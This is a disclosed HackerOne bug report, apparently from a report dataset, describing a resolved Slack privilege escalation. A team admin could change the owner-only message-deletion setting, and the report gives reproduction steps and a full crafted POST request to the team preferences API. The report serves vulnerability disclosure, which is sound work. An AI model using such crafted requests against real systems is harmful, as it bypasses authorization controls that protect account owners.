---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '46750'
original_report_id: '46750'
title: Team admin can change unauthorized team setting (allow_message_deletion)
weakness: Privilege Escalation
team_handle: slack
created_at: '2015-02-05T14:57:49.577Z'
disclosed_at: '2015-05-30T17:17:13.155Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- privilege-escalation
---

# Team admin can change unauthorized team setting (allow_message_deletion)

## Metadata

- HackerOne Report ID: 46750
- Weakness: Privilege Escalation
- Program: slack
- Disclosed At: 2015-05-30T17:17:13.155Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Team admin can escalate his privileges and change 'allow_message_deletion' team setting, which can be changed only by a team owner.

Steps to reproduce:
1. Log in as team admin.
2. Send the below request using his cookie & token and notice that it changes 'allow_message_deletion' team setting to true.

POST /api/team.prefs.set?t=1423146704 HTTP/1.1
Host: teamname.slack.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://teamname.slack.com/admin/settings
Cookie: _ga=GA1.2.630936366.1423056192; a-3204538285=..

prefs=%7B%22msg_edit_window_mins%22%3A%221%22%2C%22allow_message_deletion%22%3Atrue%7D&token=xoxs-xxxx&set_active=true&_attempts=1

To confirm, login as team owner. Navigate to /admin/settings#permissions, expand message editing & deletion section. Notice that 'Only administrators may delete messages' checkbox is checked.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
